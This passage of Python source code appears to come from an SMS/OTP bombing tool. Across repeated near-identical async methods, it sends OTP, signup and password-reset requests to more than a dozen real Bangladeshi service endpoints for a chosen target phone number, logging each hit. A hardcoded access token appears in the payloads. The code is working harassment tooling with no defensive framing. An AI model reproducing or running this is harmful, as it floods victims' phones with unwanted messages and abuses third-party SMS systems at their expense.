            elif "Arogga" in "API40 - Grameenphone FI": payload = {"mobile": target}
            elif "MyGP" in "API40 - Grameenphone FI": pass
            elif "BDSTall" in "API40 - Grameenphone FI": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API40 - Grameenphone FI": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API40 - Grameenphone FI": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API40 - Grameenphone FI": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API40 - Grameenphone FI": payload = {"phoneNumber": target}
            elif "Sindabad" in "API40 - Grameenphone FI": payload = {"mobile": target}
            elif "Kirei" in "API40 - Grameenphone FI": payload = {"phone": target}
            elif "Shikho" in "API40 - Grameenphone FI": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API40 - Grameenphone FI": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API40 - Grameenphone FI", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API40 - Grameenphone FI", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API40 - Grameenphone FI", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api41_meenabazar(self):
        target = self.target
        url = "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API41 - Meenabazar": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API41 - Meenabazar": pass
            elif "Bioscope" in "API41 - Meenabazar": payload = {"number": "+88" + target}
            elif "Proiojon" in "API41 - Meenabazar": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API41 - Meenabazar": payload = {"phone": target}
            elif "Medha" in "API41 - Meenabazar": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API41 - Meenabazar": payload = {"number": "+88" + target}
            elif "Robi" in "API41 - Meenabazar": payload = {"phone_number": target}
            elif "Arogga" in "API41 - Meenabazar": payload = {"mobile": target}
            elif "MyGP" in "API41 - Meenabazar": pass
            elif "BDSTall" in "API41 - Meenabazar": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API41 - Meenabazar": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API41 - Meenabazar": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API41 - Meenabazar": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API41 - Meenabazar": payload = {"phoneNumber": target}
            elif "Sindabad" in "API41 - Meenabazar": payload = {"mobile": target}
            elif "Kirei" in "API41 - Meenabazar": payload = {"phone": target}
            elif "Shikho" in "API41 - Meenabazar": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API41 - Meenabazar": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API41 - Meenabazar", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API41 - Meenabazar", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API41 - Meenabazar", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api42_medeasy(self):
        target = self.target
        url = "https://api.medeasy.health/api/send-otp/+88{phone}/"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API42 - Medeasy": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API42 - Medeasy": pass
            elif "Bioscope" in "API42 - Medeasy": payload = {"number": "+88" + target}
            elif "Proiojon" in "API42 - Medeasy": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API42 - Medeasy": payload = {"phone": target}
            elif "Medha" in "API42 - Medeasy": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API42 - Medeasy": payload = {"number": "+88" + target}
            elif "Robi" in "API42 - Medeasy": payload = {"phone_number": target}
            elif "Arogga" in "API42 - Medeasy": payload = {"mobile": target}
            elif "MyGP" in "API42 - Medeasy": pass
            elif "BDSTall" in "API42 - Medeasy": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API42 - Medeasy": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API42 - Medeasy": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API42 - Medeasy": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API42 - Medeasy": payload = {"phoneNumber": target}
            elif "Sindabad" in "API42 - Medeasy": payload = {"mobile": target}
            elif "Kirei" in "API42 - Medeasy": payload = {"phone": target}
            elif "Shikho" in "API42 - Medeasy": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API42 - Medeasy": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API42 - Medeasy", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API42 - Medeasy", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API42 - Medeasy", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api43_iqra_live(self):
        target = self.target
        url = "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API43 - Iqra Live": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API43 - Iqra Live": pass
            elif "Bioscope" in "API43 - Iqra Live": payload = {"number": "+88" + target}
            elif "Proiojon" in "API43 - Iqra Live": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API43 - Iqra Live": payload = {"phone": target}
            elif "Medha" in "API43 - Iqra Live": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API43 - Iqra Live": payload = {"number": "+88" + target}
            elif "Robi" in "API43 - Iqra Live": payload = {"phone_number": target}
            elif "Arogga" in "API43 - Iqra Live": payload = {"mobile": target}
            elif "MyGP" in "API43 - Iqra Live": pass
            elif "BDSTall" in "API43 - Iqra Live": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API43 - Iqra Live": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API43 - Iqra Live": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API43 - Iqra Live": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API43 - Iqra Live": payload = {"phoneNumber": target}
            elif "Sindabad" in "API43 - Iqra Live": payload = {"mobile": target}
            elif "Kirei" in "API43 - Iqra Live": payload = {"phone": target}
            elif "Shikho" in "API43 - Iqra Live": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API43 - Iqra Live": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API43 - Iqra Live", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API43 - Iqra Live", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API43 - Iqra Live", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api44_chokrojan(self):
        target = self.target
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API44 - Chokrojan": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API44 - Chokrojan": pass
            elif "Bioscope" in "API44 - Chokrojan": payload = {"number": "+88" + target}
            elif "Proiojon" in "API44 - Chokrojan": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API44 - Chokrojan": payload = {"phone": target}
            elif "Medha" in "API44 - Chokrojan": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API44 - Chokrojan": payload = {"number": "+88" + target}
            elif "Robi" in "API44 - Chokrojan": payload = {"phone_number": target}
            elif "Arogga" in "API44 - Chokrojan": payload = {"mobile": target}
            elif "MyGP" in "API44 - Chokrojan": pass
            elif "BDSTall" in "API44 - Chokrojan": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API44 - Chokrojan": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API44 - Chokrojan": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API44 - Chokrojan": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API44 - Chokrojan": payload = {"phoneNumber": target}
            elif "Sindabad" in "API44 - Chokrojan": payload = {"mobile": target}
            elif "Kirei" in "API44 - Chokrojan": payload = {"phone": target}
            elif "Shikho" in "API44 - Chokrojan": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API44 - Chokrojan": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API44 - Chokrojan", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API44 - Chokrojan", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API44 - Chokrojan", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api45_shomvob(self):
        target = self.target
        url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API45 - Shomvob": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API45 - Shomvob": pass
            elif "Bioscope" in "API45 - Shomvob": payload = {"number": "+88" + target}
            elif "Proiojon" in "API45 - Shomvob": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API45 - Shomvob": payload = {"phone": target}
            elif "Medha" in "API45 - Shomvob": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API45 - Shomvob": payload = {"number": "+88" + target}
            elif "Robi" in "API45 - Shomvob": payload = {"phone_number": target}
            elif "Arogga" in "API45 - Shomvob": payload = {"mobile": target}
            elif "MyGP" in "API45 - Shomvob": pass
            elif "BDSTall" in "API45 - Shomvob": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API45 - Shomvob": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API45 - Shomvob": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API45 - Shomvob": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API45 - Shomvob": payload = {"phoneNumber": target}
            elif "Sindabad" in "API45 - Shomvob": payload = {"mobile": target}
            elif "Kirei" in "API45 - Shomvob": payload = {"phone": target}
            elif "Shikho" in "API45 - Shomvob": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API45 - Shomvob": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API45 - Shomvob", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API45 - Shomvob", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API45 - Shomvob", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api46_redx_signup_2(self):
        target = self.target
        url = "https://api.redx.com.bd/v1/user/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API46 - RedX Signup 2": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API46 - RedX Signup 2": pass
            elif "Bioscope" in "API46 - RedX Signup 2": payload = {"number": "+88" + target}
            elif "Proiojon" in "API46 - RedX Signup 2": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API46 - RedX Signup 2": payload = {"phone": target}
            elif "Medha" in "API46 - RedX Signup 2": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API46 - RedX Signup 2": payload = {"number": "+88" + target}
            elif "Robi" in "API46 - RedX Signup 2": payload = {"phone_number": target}
            elif "Arogga" in "API46 - RedX Signup 2": payload = {"mobile": target}
            elif "MyGP" in "API46 - RedX Signup 2": pass
            elif "BDSTall" in "API46 - RedX Signup 2": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API46 - RedX Signup 2": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API46 - RedX Signup 2": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API46 - RedX Signup 2": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API46 - RedX Signup 2": payload = {"phoneNumber": target}
            elif "Sindabad" in "API46 - RedX Signup 2": payload = {"mobile": target}
            elif "Kirei" in "API46 - RedX Signup 2": payload = {"phone": target}
            elif "Shikho" in "API46 - RedX Signup 2": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API46 - RedX Signup 2": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API46 - RedX Signup 2", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API46 - RedX Signup 2", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API46 - RedX Signup 2", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api47_mygp_send_otp(self):
        target = self.target
        url = "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API47 - MyGP Send OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API47 - MyGP Send OTP": pass
            elif "Bioscope" in "API47 - MyGP Send OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API47 - MyGP Send OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API47 - MyGP Send OTP": payload = {"phone": target}
            elif "Medha" in "API47 - MyGP Send OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API47 - MyGP Send OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API47 - MyGP Send OTP": payload = {"phone_number": target}
            elif "Arogga" in "API47 - MyGP Send OTP": payload = {"mobile": target}
            elif "MyGP" in "API47 - MyGP Send OTP": pass
            elif "BDSTall" in "API47 - MyGP Send OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API47 - MyGP Send OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API47 - MyGP Send OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API47 - MyGP Send OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API47 - MyGP Send OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API47 - MyGP Send OTP": payload = {"mobile": target}
            elif "Kirei" in "API47 - MyGP Send OTP": payload = {"phone": target}
            elif "Shikho" in "API47 - MyGP Send OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API47 - MyGP Send OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API47 - MyGP Send OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API47 - MyGP Send OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API47 - MyGP Send OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api48_bdjobs(self):
        target = self.target
        url = "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API48 - BDJobs": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API48 - BDJobs": pass
            elif "Bioscope" in "API48 - BDJobs": payload = {"number": "+88" + target}
            elif "Proiojon" in "API48 - BDJobs": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API48 - BDJobs": payload = {"phone": target}
            elif "Medha" in "API48 - BDJobs": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API48 - BDJobs": payload = {"number": "+88" + target}
            elif "Robi" in "API48 - BDJobs": payload = {"phone_number": target}
            elif "Arogga" in "API48 - BDJobs": payload = {"mobile": target}
            elif "MyGP" in "API48 - BDJobs": pass
            elif "BDSTall" in "API48 - BDJobs": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API48 - BDJobs": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API48 - BDJobs": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API48 - BDJobs": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API48 - BDJobs": payload = {"phoneNumber": target}
            elif "Sindabad" in "API48 - BDJobs": payload = {"mobile": target}
            elif "Kirei" in "API48 - BDJobs": payload = {"phone": target}
            elif "Shikho" in "API48 - BDJobs": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API48 - BDJobs": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API48 - BDJobs", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API48 - BDJobs", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API48 - BDJobs", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api49_ultimate_organic_register(self):
        target = self.target
        url = "https://ultimateasiteapi.com/api/register-customer"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API49 - Ultimate Organic Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API49 - Ultimate Organic Register": pass
            elif "Bioscope" in "API49 - Ultimate Organic Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API49 - Ultimate Organic Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API49 - Ultimate Organic Register": payload = {"phone": target}
            elif "Medha" in "API49 - Ultimate Organic Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API49 - Ultimate Organic Register": payload = {"number": "+88" + target}
            elif "Robi" in "API49 - Ultimate Organic Register": payload = {"phone_number": target}
            elif "Arogga" in "API49 - Ultimate Organic Register": payload = {"mobile": target}
            elif "MyGP" in "API49 - Ultimate Organic Register": pass
            elif "BDSTall" in "API49 - Ultimate Organic Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API49 - Ultimate Organic Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API49 - Ultimate Organic Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API49 - Ultimate Organic Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API49 - Ultimate Organic Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API49 - Ultimate Organic Register": payload = {"mobile": target}
            elif "Kirei" in "API49 - Ultimate Organic Register": payload = {"phone": target}
            elif "Shikho" in "API49 - Ultimate Organic Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API49 - Ultimate Organic Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API49 - Ultimate Organic Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API49 - Ultimate Organic Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API49 - Ultimate Organic Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api50_ultimate_organic_forget(self):
        target = self.target
        url = "https://ultimateasiteapi.com/api/forget-customer-password"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API50 - Ultimate Organic Forget": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API50 - Ultimate Organic Forget": pass
            elif "Bioscope" in "API50 - Ultimate Organic Forget": payload = {"number": "+88" + target}
            elif "Proiojon" in "API50 - Ultimate Organic Forget": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API50 - Ultimate Organic Forget": payload = {"phone": target}
            elif "Medha" in "API50 - Ultimate Organic Forget": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API50 - Ultimate Organic Forget": payload = {"number": "+88" + target}
            elif "Robi" in "API50 - Ultimate Organic Forget": payload = {"phone_number": target}
            elif "Arogga" in "API50 - Ultimate Organic Forget": payload = {"mobile": target}
            elif "MyGP" in "API50 - Ultimate Organic Forget": pass
            elif "BDSTall" in "API50 - Ultimate Organic Forget": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API50 - Ultimate Organic Forget": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API50 - Ultimate Organic Forget": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API50 - Ultimate Organic Forget": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API50 - Ultimate Organic Forget": payload = {"phoneNumber": target}
            elif "Sindabad" in "API50 - Ultimate Organic Forget": payload = {"mobile": target}
            elif "Kirei" in "API50 - Ultimate Organic Forget": payload = {"phone": target}
            elif "Shikho" in "API50 - Ultimate Organic Forget": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API50 - Ultimate Organic Forget": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API50 - Ultimate Organic Forget", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API50 - Ultimate Organic Forget", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API50 - Ultimate Organic Forget", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api51_foodaholic(self):
        target = self.target
        url = "https://foodaholic.com.bd/api/v1/auth/login-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API51 - Foodaholic": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API51 - Foodaholic": pass
            elif "Bioscope" in "API51 - Foodaholic": payload = {"number": "+88" + target}
            elif "Proiojon" in "API51 - Foodaholic": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API51 - Foodaholic": payload = {"phone": target}
            elif "Medha" in "API51 - Foodaholic": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API51 - Foodaholic": payload = {"number": "+88" + target}
            elif "Robi" in "API51 - Foodaholic": payload = {"phone_number": target}
            elif "Arogga" in "API51 - Foodaholic": payload = {"mobile": target}
            elif "MyGP" in "API51 - Foodaholic": pass
            elif "BDSTall" in "API51 - Foodaholic": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API51 - Foodaholic": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API51 - Foodaholic": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API51 - Foodaholic": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API51 - Foodaholic": payload = {"phoneNumber": target}
            elif "Sindabad" in "API51 - Foodaholic": payload = {"mobile": target}
            elif "Kirei" in "API51 - Foodaholic": payload = {"phone": target}
            elif "Shikho" in "API51 - Foodaholic": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API51 - Foodaholic": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API51 - Foodaholic", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API51 - Foodaholic", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API51 - Foodaholic", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api52_kfc_bd(self):
        target = self.target
        url = "https://api.kfcbd.com/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API52 - KFC BD": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API52 - KFC BD": pass
            elif "Bioscope" in "API52 - KFC BD": payload = {"number": "+88" + target}
            elif "Proiojon" in "API52 - KFC BD": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API52 - KFC BD": payload = {"phone": target}
            elif "Medha" in "API52 - KFC BD": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API52 - KFC BD": payload = {"number": "+88" + target}
            elif "Robi" in "API52 - KFC BD": payload = {"phone_number": target}
            elif "Arogga" in "API52 - KFC BD": payload = {"mobile": target}
            elif "MyGP" in "API52 - KFC BD": pass
            elif "BDSTall" in "API52 - KFC BD": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API52 - KFC BD": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API52 - KFC BD": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API52 - KFC BD": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API52 - KFC BD": payload = {"phoneNumber": target}
            elif "Sindabad" in "API52 - KFC BD": payload = {"mobile": target}
            elif "Kirei" in "API52 - KFC BD": payload = {"phone": target}
            elif "Shikho" in "API52 - KFC BD": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API52 - KFC BD": payload = {"phone": target}
